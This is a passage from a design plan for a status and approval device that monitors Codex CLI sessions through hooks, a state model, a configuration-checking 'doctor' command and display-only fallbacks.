   packet type per concern, device-to-host debug lines. Reject unknown types
   loudly. Follow SixSigma's `{"t":"s", ...}` shape.
5. **Approve path**: blocking hook, index-not-label, question-id-keyed alerting,
   FIFO queue, input guard after redraw, fail open to the terminal on every error,
   two buttons only (allow, deny).
6. **State model**: `idle`, `working`, `waiting`, `done`, `error`, with `waiting`
   the only one that makes noise, host-side decay on `done` and `error`, a
   demotion timer on `working`, a heartbeat, and an `N/A` staleness display.
7. **`doctor` subcommand**: check the port, the hook registration and trust state,
   and (vibepulse's idea) warn if `approval_policy`, `approvals_reviewer` or
   `sandbox_mode` in `~/.codex/config.toml` would prevent any prompt from ever
   being raised.

If the hook path turns out to be unavailable or untrustworthy, the fallback ladder
is: `codex app-server --stdio` `thread/list` with the `waitingOnUserInput` flag
(display-only but accurate), then rollout JSONL tailing under `~/.codex/sessions`
(display-only, version-gate the parser for three known schema generations), then
`notify` in `config.toml` (completion only).
